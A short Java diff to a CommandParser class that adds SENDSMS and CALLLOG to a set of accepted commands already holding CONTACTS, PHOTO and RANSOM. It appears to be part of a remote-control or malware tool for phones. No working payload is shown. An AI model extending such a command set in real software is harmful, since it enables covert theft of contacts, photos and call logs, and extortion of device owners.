@@ -10,7 +10,7 @@ public class CommandParser {
 	}
 	
 	public ImmutableSet<String> acceptedCommands(){
-		return ImmutableSet.of("VIBRATE","CONTACTS","PHOTO","RANSOM");
+		return ImmutableSet.of("VIBRATE","CONTACTS","PHOTO","RANSOM","SENDSMS","CALLLOG");
 	}
 	
 	public Command dispatch(String commandString){
